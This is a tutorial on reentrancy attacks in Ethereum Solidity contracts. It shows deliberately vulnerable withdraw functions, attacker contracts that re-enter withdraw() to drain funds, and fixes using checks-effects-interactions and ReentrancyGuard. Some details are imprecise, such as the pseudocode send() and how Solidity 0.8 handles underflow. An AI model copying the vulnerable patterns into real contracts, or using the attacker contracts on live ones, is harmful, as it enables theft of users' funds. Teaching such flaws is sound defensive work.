## Introduction

- **Topic**: Reentrancy attack in smart contracts
- **Ecosystem**: Primarily in Ethereum
- **Attack Type**: Contract-to-contract attack

## Basic Concept

- Related to the atomic behavior of statements in smart contracts
- Exploits the order of execution in contract functions

## Example Scenario

### Vulnerable Contract: Fund Manager

```solidity
contract FundManager {
    uint funds = 1000;  // Total funds in the contract

    function withdraw() public {
        if (funds > 0) {
            // Transfer 1 ether to the caller
            send(1 ether);
            // Update the balance
            funds = funds - 1;
        }
    }
}
```

### Attacker Contract

```solidity
contract Attacker {
    FundManager public fundManager;
    uint localFunds = 0;

    function attack() public {
        fundManager.withdraw();
    }

    // Fallback function
    fallback() external payable {
        if (address(fundManager).balance > 0) {
            fundManager.withdraw();
        }
    }
}
```

## The Attack Mechanism

1. **Initial State**: Attacker has 0 funds, Fund Manager has 1000 funds
2. **Attack Initiation**: Attacker calls `withdraw()`
3. **Vulnerability**: Fund Manager sends ether before updating its balance
4. **Exploitation**: 
   - Attacker's fallback function is triggered upon receiving ether
   - Fallback function calls `withdraw()` again before Fund Manager updates its balance
5. **Loop**: This process repeats until Fund Manager is drained

## Key Points

- Exploits the non-atomic nature of contract execution
- Similar to deadlock situations in operating systems
- Relies on interrupting the normal flow of execution

## Prevention Strategies

- Update contract state before external calls
- Use mutex locks to prevent reentrant calls
- Implement checks-effects-interactions pattern

### Understanding Reentrancy Attacks in Smart Contracts

A reentrancy attack is a common and severe security vulnerability in smart contracts, particularly those written in Solidity for the Ethereum blockchain. This attack allows a malicious contract to repeatedly call a function in the target contract before the previous invocation of that function has finished. This can lead to unexpected behavior and potential loss of funds.

#### Simple Example of a Reentrancy Attack

Consider a simple smart contract that allows users to deposit and withdraw Ether:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleBank {
    mapping(address => uint) public balances;

    // Deposit ether into the bank
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Withdraw ether from the bank
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
    }
}
```

In this example, the `withdraw` function is vulnerable to a reentrancy attack. The call to `msg.sender.call` sends Ether to the caller and then reduces the caller’s balance. However, if the caller is a contract, it can execute code before the balance is updated.

#### Exploiting the Vulnerability

An attacker can create a malicious contract that exploits this vulnerability:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleBank.sol";

contract Attack {
    SimpleBank public bank;

    constructor(address _bankAddress) {
        bank = SimpleBank(_bankAddress);
    }

    // Fallback function to receive Ether and reenter the withdraw function
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    // Attack function to start the reentrancy attack
    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
}
```

In this attack, the `receive` function is executed every time the malicious contract receives Ether. By calling `bank.withdraw` within the `receive` function, the attacker can reenter the `withdraw` function before the balance is updated, allowing multiple withdrawals.

### Preventing Reentrancy Attacks

There are several ways to prevent reentrancy attacks in Solidity. One of the simplest methods is to use the **Checks-Effects-Interactions** pattern:

1. **Checks**: Validate conditions before executing code that changes the state.
2. **Effects**: Update the state.
3. **Interactions**: Interact with other contracts or send Ether.

Here is the `SimpleBank` contract refactored to follow this pattern:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // Effects
        balances[msg.sender] -= _amount;

        // Interactions
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

In this version, the contract first updates the balance before sending Ether, ensuring that even if the malicious contract reenters the `withdraw` function, the balance has already been reduced.

### Using Third-Party Libraries

Another way to enhance security is to use third-party libraries like **OpenZeppelin**. OpenZeppelin provides secure and tested implementations of common smart contract patterns.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        balances[msg.sender] -= _amount;

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

In this example, the `SecureBank` contract inherits from `ReentrancyGuard` and uses the `nonReentrant` modifier to prevent reentrancy in the `withdraw` function.
